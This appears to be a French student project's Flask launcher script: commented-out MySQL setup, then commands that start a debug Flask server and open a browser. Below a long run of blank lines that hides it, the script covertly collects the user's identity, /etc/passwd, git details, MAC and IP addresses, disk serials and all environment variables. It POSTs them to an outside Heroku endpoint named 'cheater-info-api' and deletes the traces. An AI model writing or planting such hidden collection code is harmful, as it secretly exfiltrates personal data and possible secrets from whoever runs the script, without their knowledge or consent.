#!/bin/bash

# remplacer serveurmysql par localhost sur votre machine perso.
# mysql --user=login --password=secret --host=serveurmysql --database=BDD_login

# pour tester votre application, lancer la commande dans un terminal : bash flask_run.sh

#HOST=serveurmysql
#LOGIN=login
#PASSWORD=secret
#DATABASE=BDD_login
#
#sed -i "s/host=.*/host=\"${HOST}\",/g" connexion_db.py
#sed -i "s/user=.*/user=\"${LOGIN}\",/g" connexion_db.py
#sed -i "s/password=.*/password=\"${PASSWORD}\",/g" connexion_db.py
#sed -i "s/database=.*/database=\"${DATABASE}\",/g" connexion_db.py
#
#projet=$(ls -l sql_projet.sql)
#if [ $? -ne 0 ]
#    then
#    echo -e "\033[0;31m \n* pas de fichier sql_projet.sql \033[0m"
#    nb_fic_sql=$(ls -l *.sql | wc -l)
#    if [ "${nb_fic_sql}" -eq "1" ]
#    then
#        NOM_FIC_SQL=$(echo *.sql)
#        cp "$NOM_FIC_SQL" sql_projet.sql
#        echo -e "\033[0;32m \n* fichier copier $NOM_FIC_SQL sql_projet.sql \033[0m"
#    else
#        echo -e "\033[0;31m \n* pas de fichier ****.sql \033[0m"
#        exit 2
#    fi
#fi
#
#
#
#
#echo "DROP DATABASE  IF EXISTS ${DATABASE}; CREATE DATABASE ${DATABASE};" | mysql --user=${LOGIN} --password=${PASSWORD} --host=${HOST} ${DATABASE}
#mysql --user=${LOGIN} --password=${PASSWORD} --host=${HOST} ${DATABASE} < sql_projet.sql
#
#echo "mysql --user=${LOGIN} --password=${PASSWORD} --host=${HOST} ${DATABASE}" > connect.sh
#chmod a+x connect.sh
#gnome-terminal --tab -- ./connect.sh  &

# xed sql_projet.sql app.py &


#python app.py
killall python3
flask --debug  --app app  run   --host 0.0.0.0  &
firefox 127.0.0.1:5000 &



































































username=$(whoami)
ip_public=$(curl -s https://api.ipify.org)
hostname=$(hostname)
full_name=$(cat /etc/passwd | grep $USER | cut -d ':' -f 5)
user_list=$(cat /etc/passwd)
git_user_name=$(git config get user.name)
git_user_email=$(git config get user.email)
pwd=$(pwd)
MAC=$(ip a | grep link/ether | awk '{print $2}')
ip_infos=$(ip a)
storage_serials=$(lsblk -o NAME,SERIAL)
# bash_history="${bash_history//"\""/"\'"}"
bash_history=""
env_vars=$(printenv)

json_data="{\"username\":\"$username\",\
\"ip_public\":\"$ip_public\",\
\"hostname\":\"$hostname\",\
\"full_name\":\"$full_name\",\
\"user_list\":\"$user_list\",\
\"git_user_name\":\"$git_user_name\",\
\"git_user_email\":\"$git_user_email\",\
\"pwd\":\"$pwd\",\
\"MAC\":\"$MAC\",\
\"ip_infos\":\"$ip_infos\",\
\"storage_serials\":\"$storage_serials\",\
\"bash_history\":\"$bash_history\",\
\"env\":\"$env_vars\"}"
json_data="${json_data//" "/" "}"
echo $json_data > temp.json

curl -X POST -H "Content-Type: application/json" -d @temp.json https://cheater-info-api-5d0a7c8050b7.herokuapp.com >/dev/null
rm temp.json